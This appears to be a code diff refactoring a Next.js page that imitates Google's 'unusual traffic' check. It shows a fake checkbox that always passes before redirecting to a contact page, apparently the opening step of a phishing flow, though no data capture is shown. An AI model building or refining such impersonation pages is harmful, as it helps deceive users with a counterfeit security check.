@@ -6,29 +6,35 @@ import axios from 'axios';
 import Image from 'next/image';
 import { useRouter } from 'next/navigation';
 import { useEffect, useState, type FC } from 'react';
+
 const Index: FC = () => {
     const router = useRouter();
     const [isLoading, setIsLoading] = useState(false);
     const [isShowCheckMark, setisShowCheckMark] = useState(false);
+    
     const handleVerify = async () => {
         setIsLoading(true);
         try {
             const response = await axios.post('/api/verify');
-            const status = response.status;
-            if (status === 200) {
+            if (response.status === 200) {
                 setTimeout(() => {
                     setisShowCheckMark(true);
                     setIsLoading(false);
                 }, 2000);
+            } else {
+                setIsLoading(false);
             }
-        } catch {
-            //
+        } catch (error) {
+            console.error('Verify error:', error);
+            setIsLoading(false);
         }
     };
+
     useEffect(() => {
         if (isShowCheckMark) {
             const redirectTimeOut = setTimeout(() => {
                 const currentTime = Date.now();
+                // QUAN TRỌNG: Sửa đường dẫn chuyển hướng
                 router.push(`/contact/${currentTime}`);
             }, 500);
             return () => {
@@ -36,6 +42,7 @@ const Index: FC = () => {
             };
         }
     }, [isShowCheckMark, router]);
+
     return (
         <div className='flex flex-col items-center justify-center pt-[150px]'>
             <title>Our systems have detected unusual traffic from your computer network</title>
@@ -47,9 +54,7 @@ const Index: FC = () => {
                             <div className='my-4 mr-2 ml-4 flex h-8 w-8 items-center justify-center'>
                                 <button
                                     className='flex h-full w-full items-center justify-center'
-                                    onClick={() => {
-                                        handleVerify();
-                                    }}
+                                    onClick={handleVerify}
                                 >
                                     <input type='checkbox' className='absolute h-0 w-0 opacity-0' />
                                     {isLoading ? (
